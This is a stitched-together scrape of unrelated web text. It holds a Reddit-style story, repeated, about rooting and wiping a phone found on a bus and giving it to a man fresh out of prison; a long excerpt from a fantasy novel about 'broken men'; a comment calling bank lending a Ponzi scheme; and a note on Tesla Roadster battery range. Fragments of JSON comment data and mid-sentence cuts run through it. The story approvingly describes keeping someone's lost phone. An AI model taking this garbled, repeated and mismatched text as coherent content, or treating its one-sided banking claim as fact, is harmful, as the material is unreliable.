About a year ago, we were upside down with everything as well. A guy rang our door bell (I will call him Greg), and wanted to sell magazines. I can't figure out how to get gas in our car so the last thing I need is what he is selling.\n\nNotice there is no car around so he must have walked. We live a bit outside of populated areas so this was odd. See tattoos, and a desperate look in his eyes. \n\nIt's still hot out and he is sort of dressed up. Told him no about the magazines but come in and have a bottle of water.\nI'm working on a customer's computer and he asks if I'm good with this stuff. It's my job, but I don't charge enough and too often do free stuff. He seems impressed, and I'm feeling wary. I ask about the job, and do people actually buy them in this day and age?\n\nNo, not really. But it's the only job he could get being fresh out of prison and all. Oh great... WTF. I venture a question about what he went in for. Being the youngest kid in a group that were stealing stereos from cars. He hadn't ever stole one yet, and was only a lookout for the older kids, teens. They got away mostly, he went to prison for three years after some court cases that keep continuing. Said public defenders sucked, and he was actually guilty in a way. But that's what kids in the neighborhood did... it was normal for him. He was running away from that life and area.\n\nHe mentioned something about writing, and learning while in prison, don't remember the details exactly. I ask how he gets home, a car will pick him up in thirty minutes from this neighborhood. Then asks if I know anything about phones.\n\nPulls out an HTC evo. Says he's locked out of his phone. I ask him to tell me the truth. He found it on a seat on a bus about 6 hours back. The bus is probably in Indiana by now and the person that owned it got off in Gary Indiana.\n\nNow how can the phone tie into this story you ask? Well, part of me said \"this is almost a stolen phone\". The other said, that person lost it because they weren't careful, maybe it can help Greg. Greg can't get a job because he can't afford a phone, has no email address, and has to work at this shitty magazine job which nets him about $20/day.\n\nI root the phone, wipe it and the SD card, disable the cellular radio portion. Then set up Google voice, VOIP, and an email address. Now Greg has access. Access to everything, and people have access to him. I explain this phone will only work at open Wi-Fi points like McDonald's or Starbuck's.\n\nI also explain that if he gets rid of it for $100 to someone, he will lose much more. Show him how to look anything up. Made him write his own numbers and passwords down. Showed him how to order free business cards online. Showed him how to use the word editor to make his resume and spell check. All on a friggin phone.\n\nGuess what. He leaves and a month later, hits me up on Google chat (I never showed him that). Says the phone enabled him to move to Kentucky and got an assistant manager job at a dispatch warehouse of some sort. He's never made this much in his life.\n\nChristmas comes around and he's wishing my family a merry Christmas (I'm atheist but it's cool). Contacts me every once in a while to keep me updated, and always mentions how grateful he is. I'd do it again just for the good feels.\n\nHe still has that phone too. Said it's the most useful thing anyone has ever given him (not sure he remembers how he actually got it, but I know what he means.)"]], [[{"comment": "What's with all these \"homeless-person morals\" tests nowadays?", "id": "d09k0uq"}, {"comment": "The other kind of \"homeless person morals test\" I've seen has been from YouTube pranksters desperate for more views. *We gave this homeless guy a pizza and then asked him for a slice.

About a year ago, we were upside down with everything as well. A guy rang our door bell (I will call him Greg), and wanted to sell magazines. I can't figure out how to get gas in our car so the last thing I need is what he is selling.\n\nNotice there is no car around so he must have walked. We live a bit outside of populated areas so this was odd. See tattoos, and a desperate look in his eyes. \n\nIt's still hot out and he is sort of dressed up. Told him no about the magazines but come in and have a bottle of water.\nI'm working on a customer's computer and he asks if I'm good with this stuff. It's my job, but I don't charge enough and too often do free stuff. He seems impressed, and I'm feeling wary. I ask about the job, and do people actually buy them in this day and age?\n\nNo, not really. But it's the only job he could get being fresh out of prison and all. Oh great... WTF. I venture a question about what he went in for. Being the youngest kid in a group that were stealing stereos from cars. He hadn't ever stole one yet, and was only a lookout for the older kids, teens. They got away mostly, he went to prison for three years after some court cases that keep continuing. Said public defenders sucked, and he was actually guilty in a way. But that's what kids in the neighborhood did... it was normal for him. He was running away from that life and area.\n\nHe mentioned something about writing, and learning while in prison, don't remember the details exactly. I ask how he gets home, a car will pick him up in thirty minutes from this neighborhood. Then asks if I know anything about phones.\n\nPulls out an HTC evo. Says he's locked out of his phone. I ask him to tell me the truth. He found it on a seat on a bus about 6 hours back. The bus is probably in Indiana by now and the person that owned it got off in Gary Indiana.\n\nNow how can the phone tie into this story you ask? Well, part of me said \"this is almost a stolen phone\". The other said, that person lost it because they weren't careful, maybe it can help Greg. Greg can't get a job because he can't afford a phone, has no email address, and has to work at this shitty magazine job which nets him about $20/day.\n\nI root the phone, wipe it and the SD card, disable the cellular radio portion. Then set up Google voice, VOIP, and an email address. Now Greg has access. Access to everything, and people have access to him. I explain this phone will only work at open Wi-Fi points like McDonald's or Starbuck's.\n\nI also explain that if he gets rid of it for $100 to someone, he will lose much more. Show him how to look anything up. Made him write his own numbers and passwords down. Showed him how to order free business cards online. Showed him how to use the word editor to make his resume and spell check. All on a friggin phone.\n\nGuess what. He leaves and a month later, hits me up on Google chat (I never showed him that). Says the phone enabled him to move to Kentucky and got an assistant manager job at a dispatch warehouse of some sort. He's never made this much in his life.\n\nChristmas comes around and he's wishing my family a merry Christmas (I'm atheist but it's cool). Contacts me every once in a while to keep me updated, and always mentions how grateful he is. I'd do it again just for the good feels.\n\nHe still has that phone too.

My lady?\u201d said Podrick. \u201cIs a broken man an outlaw?\u201d\n\n\u201cMore or less,\u201d Brienne answered.\n\nSepton Meribald disagreed. \u201cMore less than more. There are many sorts of outlaws, just as there are many sorts of birds. A sandpiper and a sea eagle both have wings, but they are not the same. The singers love to sing of good men forced to go outside the law to fight some wicked lord, but most outlaws are more like this ravening Hound than they are the lightning lord. They are evil men, driven by greed, soured by malice, despising the gods and caring only for themselves. Broken men are more deserving of our pity, though they may be just as dangerous. Almost all are common-born, simple folk who had never been more than a mile from the house where they were born until the day some lord came round to take them off to war. Poorly shod and poorly clad, they march away beneath his banners, ofttimes with no better arms than a sickle or a sharpened hoe, or a maul they made themselves by lashing a stone to a stick with strips of hide. Brothers march with brothers, sons with fathers, friends with friends. They\u2019ve heard the songs and stories, so they go off with eager hearts, dreaming of the wonders they will see, of the wealth and glory they will win. War seems a fine adventure, the greatest most of them will ever know.\n\n\u201cThen they get a taste of battle.\n\n\u201cFor some, that one taste is enough to break them. Others go on for years, until they lose count of all the battles they have fought in, but even a man who has survived a hundred fights can break in his hundred-and-first. Brothers watch their brothers die, fathers lose their sons, friends see their friends trying to hold their entrails in after they\u2019ve been gutted by an axe.\n\n\u201cThey see the lord who led them there cut down, and some other lord shouts that they are his now. They take a wound, and when that\u2019s still half-healed they take another. There is never enough to eat, their shoes fall to pieces from the marching, their clothes are torn and rotting, and half of them are shitting in their breeches from drinking bad water.\n\n\u201cIf they want new boots or a warmer cloak or maybe a rusted iron halfhelm, they need to take them from a corpse, and before long they are stealing from the living too, from the smallfolk whose lands they\u2019re fighting in, men very like the men they used to be. They slaughter their sheep and steal their chickens, and from there it\u2019s just a short step to carrying off their daughters too. And one day they look around and realize all their friends and kin are gone, that they are fighting beside strangers beneath a banner that they hardly recognize. They don\u2019t know where they are or how to get back home and the lord they\u2019re fighting for does not know their names, yet here he comes, shouting for them to form up, to make a line with their spears and scythes and sharpened hoes, to stand their ground. And the knights come down on them, faceless men clad all in steel, and the iron thunder of their charge seems to fill the world\u2026\n\n\u201cAnd the man breaks.\n\n\u201cHe turns and runs, or crawls off afterward over the corpses of the slain, or steals away in the black of night, and he finds someplace to hide. All thought of home is gone by then, and kings and lords and gods mean less to him than a haunch of spoiled meat that will let him live another day, or a skin of bad wine that might drown his fear for a few hours. The broken man lives from day to day, from meal to meal, more beast than man. Lady Brienne is not wrong. In times like these, the traveler must beware of broken men, and fear them\u2026but he should pity them as well.\u201d\n\nWhen Meribald was finished a profound silence fell upon their little band. Brienne could hear the wind rustling through a clump of pussywillows, and farther off the faint cry of a loon. She could hear Dog panting softly as he loped along beside the septon and his donkey, tongue lolling from his mouth. The quiet stretched and stretched, until finally she said, \u201cHow old were you when they marched you off to war?\u201d\n\n\u201cWhy, no older than your boy,\u201d Meribald replied. \u201cToo young for such, in truth, but my brothers were all going, and I would not be left behind. Willam said I could be his squire, though Will was no knight, only a potboy armed with a kitchen knife he\u2019d stolen from the inn. He died upon the Stepstones, and never struck a blow. It was fever did for him, and for my brother Robin. Owen died from a mace that split his head apart, and his friend Jon Pox was hanged for rape.\u201d\n\n\u201cThe War of the Ninepenny Kings?\u201d asked Hyle Hunt.\n\n\u201cSo they called it, though I never saw a king, nor earned a penny. It was a war, though.

Also  the total sum of all  loans must continuously increase or the system quickly  collapses like any other Ponzi scheme.\n\nI see you can't handle this. It remains true. or maybe you can indicate where and when  the interest is created so that it is not above and beyond all of the money that has ever been created. The system absolutely depends on loans being continually increased so that you can get the interest you need to pay from someone else's fresh loan.

There is a slight increase in the battery weight but the total range increases over 35% from the original Roadster.\"\n\nIf we get 40% more energy and 35% more range we can infer this weight increase is less than 5%.
